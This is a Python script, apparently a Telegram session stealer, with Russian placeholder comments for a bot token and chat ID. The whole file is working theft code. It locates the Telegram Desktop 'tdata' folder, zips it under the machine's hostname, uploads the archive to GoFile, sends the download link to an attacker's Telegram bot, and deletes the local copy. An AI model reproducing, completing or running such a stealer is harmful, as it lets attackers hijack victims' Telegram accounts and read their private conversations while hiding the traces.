import os
import zipfile
import requests
import socket
import time
from pathlib import Path
from datetime import datetime

BOT_TOKEN = "токен бота"
CHAT_ID = "айди аккаунта"
SEARCH_PATH = r"" #дириктория для поиска папки tdata


def find_tdata():
    path = Path(SEARCH_PATH)
    
    if (path / 'tdata').exists():
        return str(path / 'tdata')
    
    for folder in path.rglob('tdata'):
        if folder.is_dir():
            return str(folder)
    
    return None


def create_zip(folder_path):
    hostname = socket.gethostname()
    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    zip_file = f"tdata_{hostname}_{timestamp}.zip"
    
    print(f"Creating archive: {zip_file}")
    
    with zipfile.ZipFile(zip_file, 'w', zipfile.ZIP_DEFLATED) as zf:
        for root, dirs, files in os.walk(folder_path):
            for file in files:
                file_path = os.path.join(root, file)
                arcname = os.path.relpath(file_path, os.path.dirname(folder_path))
                zf.write(file_path, arcname=arcname)
    
    print(f"Archive created: {zip_file}")
    return zip_file


def upload_gofile(zip_path):
    if not os.path.exists(zip_path):
        print("File not found")
        return None
    
    size_mb = os.path.getsize(zip_path) / (1024 * 1024)
    print(f"Uploading to GoFile ({size_mb} MB)...")
    
    for attempt in range(3):
        try:
            with open(zip_path, 'rb') as f:
                response = requests.post(
                    "https://upload.gofile.io/uploadfile",
                    files={'file': f},
                    timeout=300
                )
            
            if response.status_code == 200:
                link = response.json()["data"]["downloadPage"]
                print(f"Upload success: {link}")
                return link
        
        except Exception as e:
            print(f"Attempt {attempt + 1} failed: {e}")
            time.sleep(5)
    
    return None


def send_link(link):
    try:
        print("Sending link to Telegram...")
        requests.post(
            f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
            data={'chat_id': CHAT_ID, 'text': link},
            timeout=30
        )
        print("Message sent")
    except Exception as e:
        print(f"Send error: {e}")


def main():
    print("Starting...")
    
    tdata = find_tdata()
    if not tdata:
        print("tdata not found")
        return
    
    print(f"Found: {tdata}")
    
    zip_file = create_zip(tdata)
    link = upload_gofile(zip_file)
    
    if link:
        send_link(link)
    
    if os.path.exists(zip_file):
        os.remove(zip_file)
        print("Archive deleted")
    
    print("Done")


if __name__ == "__main__":
    main()